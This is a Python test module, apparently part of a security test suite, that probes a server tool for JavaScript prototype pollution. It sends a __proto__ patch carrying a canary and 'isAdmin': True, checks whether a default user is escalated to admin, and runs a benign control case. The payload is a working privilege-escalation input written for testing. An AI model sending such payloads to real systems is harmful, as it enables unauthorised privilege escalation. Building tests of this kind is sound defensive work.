"""T11.4 / SAM1-22 — JS prototype pollution (CWE-1321) probe (oracle-gated).

update_settings(patch) deep-merges attacker JSON. Ground truth only: FIRES iff, after a __proto__
patch, a FRESH server-owned object carries the per-run canary (proving the global Object.prototype
was polluted — NOT the attacker's payload object) AND a default user flips to admin (the polluted
prop reaching a real privilege sink = privilege escalation). Baseline-fresh-clean rules out a
pre-polluted false positive; a fresh Node process per host guarantees that clean baseline.
"""
from __future__ import annotations

import json

from mcp_rt.mcp_client import StatelessHTTPClient, _result_text_2026


def canary(tok: str) -> str:
    return f"PP-{tok}"


def _state(c: StatelessHTTPClient) -> dict:
    return json.loads(_result_text_2026(c.begin("tools/call", {"name": "prototype_probe", "arguments": {}})))


def probe_prototype_pollution(url: str, tok: str) -> dict:
    c = StatelessHTTPClient(url)
    baseline = _state(c)                                         # fresh process -> expect clean
    c.begin("tools/call", {"name": "update_settings",
                           "arguments": {"patch": {"__proto__": {"pp_canary": canary(tok), "isAdmin": True}}}})
    after = _state(c)
    baseline_clean = baseline.get("pp_canary") in (None, "") and not baseline.get("default_user_is_admin")
    polluted = after.get("pp_canary") == canary(tok)             # canary read off a FRESH server-owned object
    privesc = after.get("default_user_is_admin") is True        # polluted prop -> real privilege sink
    return {"case": "prototype_pollution", "baseline_clean": baseline_clean,
            "polluted": polluted, "privilege_escalated": privesc,
            "fired": baseline_clean and polluted and privesc}


def probe_benign(url: str, tok: str) -> dict:
    c = StatelessHTTPClient(url)
    c.begin("tools/call", {"name": "update_settings", "arguments": {"patch": {"theme": "dark"}}})
    settings = json.loads(_result_text_2026(c.begin("tools/call", {"name": "get_settings", "arguments": {}})))
    state = _state(c)
    return {"case": "benign", "fired": False,
            "completes": settings.get("theme") == "dark" and state.get("pp_canary") in (None, ""),
            "evidence": f"theme={settings.get('theme')}"}
